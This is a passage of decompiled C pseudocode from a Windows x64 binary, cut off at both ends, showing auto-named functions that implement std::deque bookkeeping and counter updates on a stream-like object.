  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v6[4] = 0i64;
  v7 = operator new(0x10ui64);
  if ( !v7 )
  {
    std::_Xbad_alloc();
    __debugbreak();
  }
  *v6 = v7;
  *v7 = 0i64;
  *(_QWORD *)*v6 = v6;
  sub_140068EC0(v3 + 152, 1i64, (unsigned int *)&v9);
  return v3;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);
// 1400ADA48: using guessed type __int64 (__fastcall *off_1400ADA48)(void *);
// 1400ADBA8: using guessed type __int64 (__fastcall *off_1400ADBA8[3])();

//----- (0000000140068710) ----------------------------------------------------
void __fastcall sub_140068710(void **a1)
{
  void **v1; // rbx

  v1 = a1;
  operator delete(*a1);
  *v1 = 0i64;
}

//----- (0000000140068730) ----------------------------------------------------
signed __int64 __fastcall sub_140068730(__int64 **a1)
{
  __int64 v1; // r8

  if ( *a1 )
    v1 = **a1;
  else
    v1 = 0i64;
  return *(_QWORD *)(*(_QWORD *)(v1 + 8) + 8 * ((*(_QWORD *)(v1 + 16) - 1i64) & ((unsigned __int64)a1[2] >> 2)))
       + 4 * ((unsigned __int64)a1[2] & 3);
}

//----- (0000000140068770) ----------------------------------------------------
signed __int64 __fastcall sub_140068770(__int64 **a1)
{
  __int64 v1; // r8

  if ( *a1 )
    v1 = **a1;
  else
    v1 = 0i64;
  return *(_QWORD *)(*(_QWORD *)(v1 + 8) + 8 * ((*(_QWORD *)(v1 + 16) - 1i64) & ((unsigned __int64)a1[2] >> 1)))
       + 8 * ((unsigned __int64)a1[2] & 1);
}

//----- (00000001400687B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400687B0(__int64 a1, _QWORD *a2, __int64 a3)
{
  _QWORD **v3; // rax
  _QWORD ***v4; // r9
  __int64 v5; // rcx
  _QWORD *v6; // rax

  v3 = 0i64;
  if ( *(_QWORD *)a1 )
  {
    v4 = **(_QWORD *****)a1;
    if ( v4 )
      v3 = *v4;
  }
  v5 = *(_QWORD *)(a1 + 16);
  *a2 = 0i64;
  a2[1] = 0i64;
  a2[2] = v5 - a3;
  if ( v3 )
  {
    v6 = *v3;
    if ( v6 )
      *a2 = *v6;
  }
  return a2;
}

//----- (0000000140068800) ----------------------------------------------------
_QWORD *__fastcall sub_140068800(__int64 a1, _QWORD *a2, __int64 a3)
{
  _QWORD **v3; // r9
  _QWORD ***v4; // rax
  __int64 v5; // rcx

  v3 = 0i64;
  if ( *(_QWORD *)a1 )
  {
    v4 = **(_QWORD *****)a1;
    if ( v4 )
      v3 = *v4;
  }
  v5 = *(_QWORD *)(a1 + 16);
  *a2 = 0i64;
  a2[1] = 0i64;
  a2[2] = a3 + v5;
  if ( v3 && *v3 )
    *a2 = **v3;
  return a2;
}

//----- (0000000140068844) ----------------------------------------------------
void **__fastcall sub_140068844(__int64 a1, char a2)
{
  return sub_140068850((void *)(a1 - 8), a2);
}

//----- (0000000140068850) ----------------------------------------------------
void **__fastcall sub_140068850(void *a1, char a2)
{
  void **v2; // rsi
  char v3; // di

  v2 = (void **)a1;
  v3 = a2;
  sub_140007CF0((_QWORD *)a1 + 19);
  operator delete(v2[19]);
  v2[19] = 0i64;
  sub_140007CF0(v2 + 14);
  operator delete(v2[14]);
  v2[14] = 0i64;
  sub_1400566F0(v2 + 4);
  if ( v3 & 1 )
    operator delete(v2);
  return v2;
}

//----- (00000001400688D0) ----------------------------------------------------
bool __fastcall sub_1400688D0(__int64 a1)
{
  __int64 **v1; // r8
  __int64 v2; // r9
  char v4; // [rsp+20h] [rbp-28h]

  v1 = (__int64 **)sub_14006A270((__int64 *)(a1 + 112), &v4);
  if ( *v1 )
    v2 = **v1;
  else
    v2 = 0i64;
  return *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v2 + 8)
                               + 8 * ((*(_QWORD *)(v2 + 16) - 1i64) & ((unsigned __int64)v1[2] >> 1)))
                   + 8 * ((unsigned __int64)v1[2] & 1)) > 0ui64;
}

//----- (0000000140068930) ----------------------------------------------------
__int64 sub_140068930(_QWORD *a1, __int64 a2, _QWORD *a3, ...)
{
  unsigned __int64 v3; // rdi
  _QWORD *v4; // rsi
  __int64 v5; // rbp
  _QWORD *v6; // rbx
  unsigned __int64 v8; // rax
  __int64 v9; // r10
  va_list v10; // r9
  unsigned __int64 v11; // [rsp+50h] [rbp+8h]
  unsigned __int64 v12; // [rsp+68h] [rbp+20h]
  va_list va; // [rsp+68h] [rbp+20h]
  va_list va1; // [rsp+70h] [rbp+28h]

  va_start(va1, a3);
  va_start(va, a3);
  v12 = va_arg(va1, _QWORD);
  v3 = v12;
  v4 = a3;
  v5 = a2;
  v6 = a1;
  if ( *a3 >= (unsigned __int64)(*(__int64 (**)(void))(*a1 + 120i64))() )
    return 0i64;
  v8 = (*(__int64 (__fastcall **)(_QWORD *))(*v6 + 120i64))(v6);
  v9 = v6[4];
  v11 = v8;
  va_copy(v10, va);
  if ( v3 >= v8 )
    v10 = (va_list)&v11;
  return (*(__int64 (__fastcall **)(_QWORD *, __int64, _QWORD *, _QWORD))(v9 + 256))(v6 + 4, v5, v4, *(_QWORD *)v10);
}

//----- (00000001400689C0) ----------------------------------------------------
char __fastcall sub_1400689C0(__int64 *a1)
{
  __int64 *v1; // rbx
  bool v2; // zf
  _QWORD *v3; // rax
  _QWORD *v4; // rax
  _QWORD *v5; // r8
  char v7; // [rsp+20h] [rbp-38h]
  char v8; // [rsp+38h] [rbp-20h]

  v1 = a1;
  if ( !(*(unsigned int (**)(void))(*a1 + 184))() || (*(unsigned __int8 (__fastcall **)(__int64 *))(*v1 + 128))(v1) )
    return 0;
  v2 = v1[18]-- == 1;
  if ( v2 )
    v1[17] = 0i64;
  else
    ++v1[17];
  v3 = sub_14006A270(v1 + 19, &v7);
  v4 = sub_140068800((__int64)v3, &v8, 0i64);
  v5 = (_QWORD *)*v4;
  if ( *v4 )
    v5 = (_QWORD *)*v5;
  if ( !*(_DWORD *)(*(_QWORD *)(v5[1] + 8 * ((v5[2] - 1i64) & (v4[2] >> 2))) + 4 * (v4[2] & 3i64))
    && (unsigned __int64)v1[23] > 1 )
  {
    v2 = v1[23]-- == 1;
    if ( v2 )
    {
      v1[22] = 0i64;
      return 1;
    }
    ++v1[22];
  }
  return 1;
}

//----- (0000000140068AB0) ----------------------------------------------------
__int64 *__fastcall sub_140068AB0(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v3; // [rsp+30h] [rbp+8h]

  v1 = a1;
  (*(void (__fastcall **)(__int64))(*(_QWORD *)(a1 + 32) + 56i64))(a1 + 32);
  v3 = 0i64;
  sub_14006A170((__int64 *)(v1 + 112), 1ui64, (__int64 **)&v3);
  LODWORD(v3) = 0;
  return sub_14006A070((__int64 *)(v1 + 152), 1ui64, (unsigned int *)&v3);
}

//----- (0000000140068B10) ----------------------------------------------------
char __fastcall sub_140068B10(__int64 a1)
{
  int v2; // [rsp+30h] [rbp+8h]

  v2 = 0;
  sub_14006A6F0(a1 + 152, (unsigned int *)&v2);
  return 0;
}

//----- (0000000140068B40) ----------------------------------------------------
__int64 __fastcall sub_140068B40(__int64 a1)
{
  _QWORD *v1; // rax
  _QWORD *v2; // r8
  _QWORD *v3; // rax
  char v5; // [rsp+20h] [rbp-28h]

  v1 = sub_14006A270((__int64 *)(a1 + 112), &v5);
  v2 = v1;
  v3 = (_QWORD *)*v1;
  if ( v3 )
    v3 = (_QWORD *)*v3;
  return *(_QWORD *)(*(_QWORD *)(v3[1] + 8 * ((v3[2] - 1i64) & (v2[2] >> 1))) + 8 * (v2[2] & 1i64));
}

//----- (0000000140068B90) ----------------------------------------------------
__int64 __fastcall sub_140068B90(__int64 a1)
{
  return (unsigned int)(*(_DWORD *)(a1 + 184) - 1);
}

//----- (0000000140068BA0) ----------------------------------------------------
__int64 __fastcall sub_140068BA0(__int64 a1)
{
  return (unsigned int)(*(_DWORD *)(a1 + 144) - 1);
}

//----- (0000000140068BB0) ----------------------------------------------------
__int64 __fastcall sub_140068BB0(__int64 a1)
{
  _QWORD *v1; // rax
  _QWORD *v2; // rax
  _QWORD *v3; // r8
  _QWORD *v4; // rax
  char v6; // [rsp+20h] [rbp-38h]
  char v7; // [rsp+38h] [rbp-20h]

  v1 = sub_14006A270((__int64 *)(a1 + 152), &v6);
  v2 = sub_140068800((__int64)v1, &v7, 0i64);
  v3 = v2;
  v4 = (_QWORD *)*v2;
  if ( v4 )
    v4 = (_QWORD *)*v4;
  return *(unsigned int *)(*(_QWORD *)(v4[1] + 8 * ((v4[2] - 1i64) & (v3[2] >> 2))) + 4 * (v3[2] & 3i64));
}

//----- (0000000140068C10) ----------------------------------------------------
__int64 __fastcall sub_140068C10(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v4; // r15
  int v5; // ebp
  __int64 v6; // rsi
  _QWORD *v7; // rax
  __int64 **v8; // rax
  __int64 v9; // rdi
  __int64 v10; // r8
  unsigned __int64 v11; // rcx
  __int64 v12; // rax
  __int64 v13; // rcx
  __int64 v14; // rdx
  unsigned __int64 v15; // rsi
  signed __int64 v16; // r14
  void *v17; // rcx
  _QWORD *v18; // rcx
  _QWORD *v19; // rax
  __int64 **v20; // rax
  signed __int64 v21; // rdx
  __int64 v22; // rax
  char v24; // [rsp+30h] [rbp-48h]
  char v25; // [rsp+48h] [rbp-30h]

  v4 = a1;
  v5 = a4;
  v6 = a3;
  (*(void (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)(a1 + 32) + 40i64))(
    a1 + 32,
    a2,
    a3,
    0i64,
    1);
  v7 = sub_140070CD0((__int64 *)(v4 + 112), &v24);
  v8 = (__int64 **)sub_1400687B0((__int64)v7, &v25, 1i64);
  v9 = 0i64;
  if ( *v8 )
    v10 = **v8;
  else
    v10 = 0i64;
  v11 = (unsigned __int64)v8[2];
  v12 = *(_QWORD *)(*(_QWORD *)(v10 + 8) + 8 * ((*(_QWORD *)(v10 + 16) - 1i64) & (v11 >> 1)));
  *(_QWORD *)(v12 + 8 * (v11 & 1)) += v6;
  if ( v5 )
  {
    v13 = *(_QWORD *)(v4 + 144);
    if ( !((*(_BYTE *)(v4 + 136) + (_BYTE)v13) & 1) && *(_QWORD *)(v4 + 128) <= (unsigned __int64)(v13 + 2) >> 1 )
      sub_140069110((_QWORD *)(v4 + 112), 1ui64);
    v14 = *(_QWORD *)(v4 + 128);
    *(_QWORD *)(v4 + 136) &= 2 * v14 - 1;
    v15 = *(_QWORD *)(v4 + 144) + *(_QWORD *)(v4 + 136);
    v16 = 8 * ((v15 >> 1) & (v14 - 1));
    if ( !*(_QWORD *)(v16 + *(_QWORD *)(v4 + 120)) )
    {
      v17 = operator new(0x10ui64);
      if ( !v17 )
      {
        std::_Xbad_alloc();
        __debugbreak();
      }
      *(_QWORD *)(v16 + *(_QWORD *)(v4 + 120)) = v17;
    }
    v18 = (_QWORD *)(*(_QWORD *)(v16 + *(_QWORD *)(v4 + 120)) + 8 * (v15 & 1));
    if ( v18 )
      *v18 = 0i64;
    ++*(_QWORD *)(v4 + 144);
    v19 = sub_140070CD0((__int64 *)(v4 + 152), &v25);
    v20 = (__int64 **)sub_1400687B0((__int64)v19, &v24, 1i64);
    if ( *v20 )
      v9 = **v20;
    v21 = (unsigned __int64)v20[2] & 3;
    v22 = *(_QWORD *)(*(_QWORD *)(v9 + 8) + 8 * ((*(_QWORD *)(v9 + 16) - 1i64) & ((unsigned __int64)v20[2] >> 2)));
    ++*(_DWORD *)(v22 + 4 * v21);
  }
  return 0i64;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140068DE0) ----------------------------------------------------
void __fastcall sub_140068DE0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 24) = a2;
}

//----- (0000000140068DF0) ----------------------------------------------------
__int64 __fastcall sub_140068DF0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 32) + 120i64))(a1 + 32);
}

//----- (0000000140068E00) ----------------------------------------------------
__int64 __fastcall sub_140068E00(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, char a5)
{
  __int64 v5; // rbx
  __int64 *v6; // r14
  __int64 v7; // rdi
  __int64 v8; // rsi
  unsigned __int64 v9; // rax
  bool v10; // cf
  __int64 *v11; // r10
  char v12; // ST20_1
  __int64 v13; // rbx
  _QWORD *v14; // rax
  _QWORD *v15; // r8
  _QWORD *v16; // rcx
  char v18; // [rsp+30h] [rbp-28h]
  unsigned __int64 v19; // [rsp+60h] [rbp+8h]

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  v9 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 120i64))();
  v10 = *v6 < v9;
  v19 = v9;
  v11 = (__int64 *)&v19;
  if ( v10 )
    v11 = v6;
  *v6 = *v11;
  v12 = a5;
  v13 = (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, __int64, char))(*(_QWORD *)(v8 + 32) + 248i64))(
          v8 + 32,
          v7,
          v6,
          v5,
          v12);
  v14 = sub_14006A270((__int64 *)(v8 + 112), &v18);
  v15 = (_QWORD *)*v14;
  if ( *v14 )
    v15 = (_QWORD *)*v15;
  v16 = (_QWORD *)(*(_QWORD *)(v15[1] + 8 * ((v15[2] - 1i64) & (v14[2] >> 1))) + 8 * (v14[2] & 1i64));
  *v16 -= *v6;
  return v13;
}

//----- (0000000140068EC0) ----------------------------------------------------
__int64 __fastcall sub_140068EC0(__int64 a1, __int64 a2, unsigned int *a3)
{
  unsigned int *v3; // rsi
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 result; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  while ( v4 )
  {
    result = sub_14006A6F0(v5, v3);
    --v4;
  }
  return result;
}

//----- (0000000140068F10) ----------------------------------------------------
__int64 __fastcall sub_140068F10(__int64 a1, __int64 a2, __int64 *a3)
{
  __int64 *v3; // rsi
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 result; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  while ( v4 )
  {
    result = sub_14006A7D0(v5, v3);
    --v4;
  }
  return result;
}

//----- (0000000140068F60) ----------------------------------------------------
void __fastcall sub_140068F60(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // rdi
  unsigned __int64 v3; // rbx
  _QWORD *v4; // rbp
  unsigned __int64 v5; // rbx
  unsigned __int64 v6; // rcx
  char *v7; // r15
  unsigned __int64 v8; // r14
  signed __int64 v9; // rsi
  size_t v10; // rdi
  char *v11; // rax
  const void *v12; // rdx
  char *v13; // rcx
  char *v14; // rax
  void *v15; // rdi
  unsigned __int64 v16; // rcx
  char *v17; // rax
  void *v18; // rcx

  v2 = a1[2];
  v3 = 1i64;
  v4 = a1;
  if ( v2 )
    v3 = a1[2];
  while ( v3 - v2 < a2 || v3 < 8 )
  {
    if ( 0xFFFFFFFFFFFFFFFi64 - v3 < v3 )
    {
      std::_Xlength_error("deque<T> too long");
      JUMPOUT(*(_QWORD *)&byte_14006910B);
    }
    v3 *= 2i64;
  }
  v5 = v3 - v2;
  v6 = v2 + v5;
  v7 = 0i64;
  v8 = v4[3] >> 2;
  if ( v2 + v5 )
  {
    if ( v6 > 0x1FFFFFFFFFFFFFFFi64 || (v7 = (char *)operator new(8 * v6)) == 0i64 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
  }
  v9 = 8 * v8;
  v10 = 8 * ((signed __int64)(8i64 * v4[2] - 8 * v8) >> 3);
  v11 = (char *)memmove(&v7[8 * v8], (const void *)(8 * v8 + v4[1]), v10);
  v12 = (const void *)v4[1];
  v13 = &v11[v10];
  if ( v8 > v5 )
  {
    memmove(v13, v12, 8 * v5 & 0xFFFFFFFFFFFFFFF8ui64);
    v17 = (char *)memmove(v7, (const void *)(8 * v5 + v4[1]), 8 * ((signed __int64)(v9 - 8 * v5) >> 3))
        + 8 * ((signed __int64)(v9 - 8 * v5) >> 3);
    if ( !v5 )
      goto LABEL_19;
    v15 = v17;
    v16 = v5;
    goto LABEL_18;
  }
  v14 = (char *)memmove(v13, v12, 8 * (v9 >> 3)) + 8 * (v9 >> 3);
  if ( v5 != v8 )
    memset(v14, 0, 8 * (v5 - v8));
  if ( v8 )
  {
    v15 = v7;
    v16 = v8;
LABEL_18:
    memset(v15, 0, 8 * v16);
  }
LABEL_19:
  v18 = (void *)v4[1];
  if ( v18 )
    operator delete(v18);
  v4[2] += v5;
  v4[1] = v7;
}
// 14006910B: using guessed type char;
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140069110) ----------------------------------------------------
void __fastcall sub_140069110(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // rdi
  unsigned __int64 v3; // rbx
  _QWORD *v4; // rbp
  unsigned __int64 v5; // rbx
  unsigned __int64 v6; // rcx
  char *v7; // r15
  unsigned __int64 v8; // r14
  signed __int64 v9; // rsi
  size_t v10; // rdi
  char *v11; // rax
  const void *v12; // rdx
  char *v13; // rcx
  char *v14; // rax
  void *v15; // rdi
  unsigned __int64 v16; // rcx
  char *v17; // rax
  void *v18; // rcx

  v2 = a1[2];
  v3 = 1i64;
  v4 = a1;
  if ( v2 )
    v3 = a1[2];
  while ( v3 - v2 < a2 || v3 < 8 )
  {
    if ( 0xFFFFFFFFFFFFFFFi64 - v3 < v3 )
    {
      std::_Xlength_error("deque<T> too long");
      JUMPOUT(*(_QWORD *)&byte_1400692BA);
    }
    v3 *= 2i64;
  }
  v5 = v3 - v2;
  v6 = v2 + v5;
  v7 = 0i64;
  v8 = v4[3] >> 1;
  if ( v2 + v5 )
  {
    if ( v6 > 0x1FFFFFFFFFFFFFFFi64 || (v7 = (char *)operator new(8 * v6)) == 0i64 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
  }
  v9 = 8 * v8;
  v10 = 8 * ((signed __int64)(8i64 * v4[2] - 8 * v8) >> 3);
  v11 = (char *)memmove(&v7[8 * v8], (const void *)(8 * v8 + v4[1]), v10);
  v12 = (const void *)v4[1];
  v13 = &v11[v10];
  if ( v8 > v5 )
  {
    memmove(v13, v12, 8 * v5 & 0xFFFFFFFFFFFFFFF8ui64);
    v17 = (char *)memmove(v7, (const void *)(8 * v5 + v4[1]), 8 * ((signed __int64)(v9 - 8 * v5) >> 3))
        + 8 * ((signed __int64)(v9 - 8 * v5) >> 3);
    if ( !v5 )
      goto LABEL_19;
    v15 = v17;
    v16 = v5;
    goto LABEL_18;
  }
  v14 = (char *)memmove(v13, v12, 8 * (v9 >> 3)) + 8 * (v9 >> 3);
  if ( v5 != v8 )
    memset(v14, 0, 8 * (v5 - v8));
  if ( v8 )
  {
    v15 = v7;
    v16 = v8;
LABEL_18:
    memset(v15, 0, 8 * v16);
  }
LABEL_19:
  v18 = (void *)v4[1];
  if ( v18 )
    operator delete(v18);
  v4[2] += v5;
  v4[1] = v7;
}
// 1400692BA: using guessed type char;
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (00000001400692C0) ----------------------------------------------------
__int64 *__fastcall sub_1400692C0(__int64 *a1, __int64 a2, unsigned __int64 a3, unsigned int *a4)
{
  unsigned int *v4; // r13
  unsigned __int64 v5; // r14
  __int64 v6; // r15
  __m128i v7; // di
  unsigned __int64 v8; // r15
  unsigned __int64 v9; // r12
  unsigned __int64 v10; // rbx
  unsigned __int64 l; // rbx
  unsigned __int64 m; // rbx
  _QWORD *v13; // rax
  __int64 **v14; // rax
  __int64 v15; // r8
  _QWORD *v16; // rax
  __int64 *****v17; // rax
  __int64 ****v18; // rcx
  __int64 **v19; // rbx
  __int64 ***v20; // rdx
  __int64 v21; // rdi
  _QWORD *v22; // rax
  __int64 *result; // rax
  _QWORD *v24; // rax
  __int64 **v25; // rax
  __int64 v26; // r8
  _QWORD *v27; // rax
  _QWORD *v28; // rdx
  _QWORD **v29; // rcx
  _QWORD ***v30; // r8
  __int64 v31; // rdx
  unsigned int v32; // er12
  _QWORD *v33; // rbx
  _QWORD *v34; // rax
  _QWORD *v35; // rbx
  _QWORD *v36; // rax
  __int64 ****v37; // rdx
  _QWORD *v38; // rcx
  __int64 v39; // r9
  __int64 **v40; // rcx
  __int64 v41; // rcx
  unsigned __int64 v42; // r8
  unsigned __int64 j; // r14
  unsigned __int64 k; // rbx
  _QWORD *v45; // rax
  __int64 **v46; // rax
  __int64 v47; // r8
  _QWORD *v48; // rax
  _QWORD *v49; // rcx
  _QWORD **v50; // rbx
  _QWORD ***v51; // rdx
  __int64 v52; // rdi
  _QWORD *v53; // rax
  unsigned __int64 i; // rbx
  _QWORD *v55; // rax
  __int64 **v56; // rax
  __int64 v57; // r8
  __int64 *******v58; // rax
  __int64 ******v59; // rcx
  __int64 ****v60; // rbx
  __int64 *****v61; // rdx
  unsigned int v62; // er15
  _QWORD *v63; // r13
  _QWORD *v64; // rax
  _QWORD *v65; // rax
  __int64 *v66; // r9
  __int64 **v67; // rcx
  __int64 **v68; // rdx
  __int64 v69; // r9
  unsigned __int64 v70; // r8
  __m128i v71; // [rsp+20h] [rbp-E8h]
  __int64 ****v72; // [rsp+30h] [rbp-D8h]
  __int128 v73; // [rsp+40h] [rbp-C8h]
  __int64 v74; // [rsp+50h] [rbp-B8h]
  char v75; // [rsp+58h] [rbp-B0h]
  char v76; // [rsp+70h] [rbp-98h]
  char v77; // [rsp+88h] [rbp-80h]
  char v78; // [rsp+A0h] [rbp-68h]
  __int64 v79; // [rsp+B8h] [rbp-50h]
  char v80; // [rsp+C0h] [rbp-48h]

  v79 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = *(_QWORD *)(a2 + 16);
  v7.m128i_i64[1] = (__int64)a1;
  _mm_storeu_si128(&v71, (__m128i)0i64);
  v7.m128i_i64[0] = 0i64;
  v72 = 0i64;
  v8 = v6 - sub_14006A270(a1, &v73)[2];
  v9 = *(_QWORD *)(v7.m128i_i64[1] + 32) - v8;
  if ( v8 >= v9 )
  {
    if ( v9 >= v5 )
    {
      for ( i = 0i64; ; ++i )
      {
        v55 = sub_14006A270((__int64 *)v7.m128i_i64[1], &v75);
        if ( i >= v5 )
          break;
        v56 = (__int64 **)sub_140068800((__int64)v55, &v77, v8 + v9 + i - v5);
        if ( *v56 )
          v57 = **v56;
        else
          v57 = 0i64;
        sub_14006A6F0(
          v7.m128i_i64[1],
          (unsigned int *)(*(_QWORD *)(*(_QWORD *)(v57 + 8)
                                     + 8 * (((unsigned __int64)v56[2] >> 2) & (*(_QWORD *)(v57 + 16) - 1i64)))
                         + 4 * ((unsigned __int64)v56[2] & 3)));
      }
      v58 = (__int64 *******)sub_140068800((__int64)v55, &v77, v8);
      v59 = *v58;
      v60 = (__int64 ****)v71.m128i_i64[0];
      if ( (__int64 ******)v71.m128i_i64[0] != *v58 )
      {
        if ( v59 )
        {
          v61 = *v59;
          if ( *v59 )
          {
            v60 = *v61;
            v71.m128i_i64[0] = (__int64)*v61;
          }
        }
      }
      v7.m128i_i64[1] = (__int64)v58[2];
      v72 = (__int64 ****)v58[2];
      v62 = *v4;
      v63 = sub_140068800((__int64)&v71, &v75, v9);
      v64 = sub_140068800((__int64)&v71, &v77, v9);
      v65 = sub_1400687B0((__int64)v64, &v78, v5);
      _mm_storeu_si128((__m128i *)&v73, (__m128i)0i64);
      if ( v60 && *v60 )
        *(_QWORD *)&v73 = **v60;
      v74 = v7.m128i_i64[1];
      sub_140068200(&v80, (__int64)&v73, (__int64)v65, (__int64)v63);
      result = sub_140068800((__int64)&v71, &v75, v5);
      v66 = result;
      v67 = 0i64;
      if ( v60 && *v60 )
        v67 = **v60;
      *(_QWORD *)&v73 = 0i64;
      v68 = (__int64 **)*result;
      if ( *result )
      {
        result = *v68;
        if ( *v68 )
        {
          result = (__int64 *)*result;
          *(_QWORD *)&v73 = result;
        }
      }
      v69 = v66[2];
      if ( v67 )
      {
        result = *v67;
        if ( *v67 )
        {
          result = (__int64 *)*result;
          if ( result )
            v7.m128i_i64[0] = *result;
        }
      }
      v71 = v7;
      _mm_store_si128(&v71, v7);
      if ( v7.m128i_i64[1] != v69 )
      {
        v70 = v71.m128i_u64[1];
        do
        {
          result = *(__int64 **)(v7.m128i_i64[0] + 8);
          *(_DWORD *)(result[(*(_QWORD *)(v7.m128i_i64[0] + 16) - 1i64) & (v70 >> 2)] + 4 * (v70 & 3)) = v62;
          ++v70;
        }
        while ( v70 != v69 );
      }
    }
    else
    {
      for ( j = v5 - v9; j; --j )
        sub_14006A6F0(v7.m128i_i64[1], v4);
      for ( k = 0i64; ; ++k )
      {
        v45 = sub_14006A270((__int64 *)v7.m128i_i64[1], &v75);
        if ( k >= v9 )
          break;
        v46 = (__int64 **)sub_140068800((__int64)v45, &v77, k + v8);
        if ( *v46 )
          v47 = **v46;
        else
          v47 = 0i64;
        sub_14006A6F0(
          v7.m128i_i64[1],
          (unsigned int *)(*(_QWORD *)(*(_QWORD *)(v47 + 8)
                                     + 8 * (((unsigned __int64)v46[2] >> 2) & (*(_QWORD *)(v47 + 16) - 1i64)))
                         + 4 * ((unsigned __int64)v46[2] & 3)));
      }
      v48 = sub_140068800((__int64)v45, &v77, v8);
      v49 = (_QWORD *)*v48;
      v50 = (_QWORD **)v71.m128i_i64[0];
      if ( v71.m128i_i64[0] != *v48 )
      {
        if ( v49 )
        {
          v51 = (_QWORD ***)*v49;
          if ( *v49 )
          {
            v50 = *v51;
            v71.m128i_i64[0] = (__int64)*v51;
          }
        }
      }
      v52 = v48[2];
      v72 = (__int64 ****)v48[2];
      v53 = sub_140068800((__int64)&v71, &v75, v9);
      _mm_storeu_si128((__m128i *)&v73, (__m128i)0i64);
      if ( v50 && *v50 )
        *(_QWORD *)&v73 = **v50;
      v74 = v52;
      result = sub_1400684A0((_QWORD **)&v73, (__int64)v53, v4);
    }
  }
  else
  {
    v10 = v5;
    if ( v8 >= v5 )
    {
      while ( 1 )
      {
        v24 = sub_14006A270((__int64 *)v7.m128i_i64[1], &v76);
        if ( !v10 )
          break;
        v25 = (__int64 **)sub_140068800((__int64)v24, &v73, v5 - 1);
        if ( *v25 )
          v26 = **v25;
        else
          v26 = 0i64;
        sub_14006A8A0(
          v7.m128i_i64[1],
          (unsigned int *)(*(_QWORD *)(*(_QWORD *)(v26 + 8)
                                     + 8 * (((unsigned __int64)v25[2] >> 2) & (*(_QWORD *)(v26 + 16) - 1i64)))
                         + 4 * ((unsigned __int64)v25[2] & 3)));
        --v10;
      }
      v27 = sub_140068800((__int64)v24, &v73, v5);
      v28 = (_QWORD *)*v27;
      v29 = (_QWORD **)v71.m128i_i64[0];
      if ( v71.m128i_i64[0] != *v27 )
      {
        if ( v28 )
        {
          v30 = (_QWORD ***)*v28;
          if ( *v28 )
          {
            v29 = *v30;
            v71.m128i_i64[0] = (__int64)*v30;
          }
        }
      }
      v31 = v27[2];
      v72 = (__int64 ****)v27[2];
      v32 = *v4;
      _mm_storeu_si128((__m128i *)&v73, (__m128i)0i64);
      if ( v29 && *v29 )
        *(_QWORD *)&v73 = **v29;
      v74 = v31;
      v33 = sub_140068800((__int64)&v71, &v76, v8);
      v34 = sub_140068800((__int64)&v71, &v80, v5);
      sub_140067F60(&v78, (__int64)v34, (__int64)v33, (__int64)&v73);
      v35 = sub_140068800((__int64)&v71, &v78, v8);
      v36 = sub_14006A270((__int64 *)v7.m128i_i64[1], &v77);
      v37 = (__int64 ****)sub_140068800((__int64)v36, &v75, v8);
      *(_QWORD *)&v73 = 0i64;
      if ( *v35 )
      {
        v38 = *(_QWORD **)*v35;
        if ( v38 )
          *(_QWORD *)&v73 = *v38;
      }
      v39 = v35[2];
      result = 0i64;
      if ( *v37 )
      {
        v40 = **v37;
        if ( v40 )
          result = *v40;
      }
      v41 = (__int64)v37[2];
      if ( result )
        v7.m128i_i64[0] = *result;
      v71.m128i_i64[0] = v7.m128i_i64[0];
      v71.m128i_i64[1] = v41;
      _mm_store_si128(&v71, v71);
      if ( v41 != v39 )
      {
        v42 = v71.m128i_u64[1];
        do
        {
          result = *(__int64 **)(v7.m128i_i64[0] + 8);
          *(_DWORD *)(result[(v42 >> 2) & (*(_QWORD *)(v7.m128i_i64[0] + 16) - 1i64)] + 4 * (v42 & 3)) = v32;
          ++v42;
        }
        while ( v42 != v39 );
      }
    }
    else
    {
      for ( l = v5 - v8; l; --l )
        sub_14006A8A0(v7.m128i_i64[1], v4);
      for ( m = v8; m; --m )
      {
        v13 = sub_14006A270((__int64 *)v7.m128i_i64[1], &v73);
        v14 = (__int64 **)sub_140068800((__int64)v13, &v76, v5 - 1);
        if ( *v14 )
          v15 = **v14;
        else
          v15 = 0i64;
        sub_14006A8A0(
          v7.m128i_i64[1],
          (unsigned int *)(*(_QWORD *)(*(_QWORD *)(v15 + 8)
                                     + 8 * (((unsigned __int64)v14[2] >> 2) & (*(_QWORD *)(v15 + 16) - 1i64)))
                         + 4 * ((unsigned __int64)v14[2] & 3)));
      }
      v16 = sub_14006A270((__int64 *)v7.m128i_i64[1], &v76);
      v17 = (__int64 *****)sub_140068800((__int64)v16, &v73, v5);
      v18 = *v17;
      v19 = (__int64 **)v71.m128i_i64[0];
      if ( (__int64 ****)v71.m128i_i64[0] != *v17 )
      {
        if ( v18 )
        {
          v20 = *v18;
          if ( *v18 )
          {
            v19 = *v20;
            v71.m128i_i64[0] = (__int64)*v20;
          }
        }
      }
      v21 = (__int64)v17[2];
      v72 = v17[2];
      v22 = sub_140068800((__int64)&v71, &v76, v8);
      _mm_storeu_si128(&v71, (__m128i)0i64);
      if ( v19 && *v19 )
        v71.m128i_i64[0] = **v19;
      v72 = (__int64 ****)v21;
